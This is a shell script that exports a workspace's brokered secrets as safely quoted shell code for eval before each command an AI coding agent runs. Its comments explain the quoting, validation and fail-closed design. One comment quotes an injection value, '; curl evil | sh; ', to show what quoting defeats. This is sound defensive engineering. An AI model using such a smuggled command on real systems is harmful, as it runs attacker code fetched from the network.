#!/bin/sh
# drydock-secrets export — the workspace's granted secrets, as shell code for
# eval (design §10.3). CLAUDE_ENV_FILE points at a one-line script,
#
#   eval "$(drydock-secrets export)"
#
# which Claude Code runs before every Bash command (Spike 03), so a rotated or
# newly granted secret reaches the next command with nothing restarted.
#
# Four rules, each of which fails quietly if broken:
#
#   * Every value is single-quoted, an embedded ' written as '\''. Inside
#     single quotes nothing is special, so a value is data and never code: a
#     value of  '; curl evil | sh; '  is exported verbatim, not run — and
#     unquoted it would run before every command the agent issues.
#   * The fetch fails unless count= matches the lines received, every line is
#     NAME value with a well-formed name, and END closes it. A short read is
#     indistinguishable from a truncated secret, and a forged extra line is
#     how a reserved name like GH_TOKEN would be smuggled past the write-time
#     check (§10.1).
#   * Silent on success. Whatever this writes to stdout besides the exports,
#     or to stderr at all, is prepended to every tool result the agent reads
#     for the rest of the session.
#   * On failure, one line on stderr and `exit 69` on stdout as well as in the
#     exit status. The status alone is not enough: `eval "$(false)"` evaluates
#     the empty string and succeeds, so a helper that only exited non-zero
#     would let the command run without its secrets. Printing `exit 69` makes
#     the eval itself end the command shell, so a broker outage aborts every
#     command loudly instead of running a test suite with TEST_DATABASE_URL
#     unset (§10.3 constraint 4).
#
# Pure shell builtins after the fetch: no sed, no awk, no temporary file —
# values never touch a disk or another process's argv. Values reach this
# script's stdout and the eval, nothing else.
set -u

fail() {
	echo "drydock: secrets unavailable: $1" >&2
	echo 'exit 69'
	exit 69
}

if [ $# -ne 1 ] || [ "$1" != export ]; then
	echo "usage: drydock-secrets export" >&2
	echo 'exit 64'
	exit 64
fi

# drydock-broker prints its own one line on stderr when it fails.
answer=$(DRYDOCK_BROKER_FOR=secrets drydock-broker GET-SECRETS) || {
	echo 'exit 69'
	exit 69
}

nl='
'
q="'"
head=${answer%%"$nl"*}
case $head in
"OK count="*) count=${head#OK count=} ;;
*) fail "the broker's answer was not understood" ;;
esac
case $count in
'' | *[!0123456789]*) fail "the broker's answer was not understood" ;;
esac
if [ "$head" = "$answer" ]; then
	fail "the answer was cut short"
fi
rest=${answer#*"$nl"}$nl

out=
n=0
ended=false
while [ -n "$rest" ]; do
	line=${rest%%"$nl"*}
	rest=${rest#*"$nl"}
	if [ "$ended" = true ]; then
		fail "the answer went on past END"
	fi
	if [ "$line" = END ]; then
		ended=true
		continue
	fi
	case $line in
	*" "*) ;;
	*) fail "the answer held a malformed line" ;;
	esac
	name=${line%% *}
	value=${line#* }
	# The name pattern, spelled out letter by letter: a range like [A-Z]
	# matches lowercase letters too in some locales.
	case $name in
	'' | [!ABCDEFGHIJKLMNOPQRSTUVWXYZ_]* | *[!ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_]*)
		fail "the answer held a malformed name"
		;;
	esac
	quoted=
	while :; do
		case $value in
		*"$q"*)
			quoted=$quoted${value%%"$q"*}"$q\\$q$q"
			value=${value#*"$q"}
			;;
		*)
			quoted=$quoted$value
			break
			;;
		esac
	done
	out="${out}export $name='$quoted'$nl"
	n=$((n + 1))
done

[ "$ended" = true ] || fail "the answer was cut short"
[ "$n" -eq "$count" ] || fail "the broker announced $count secrets and sent $n"
printf '%s' "$out"
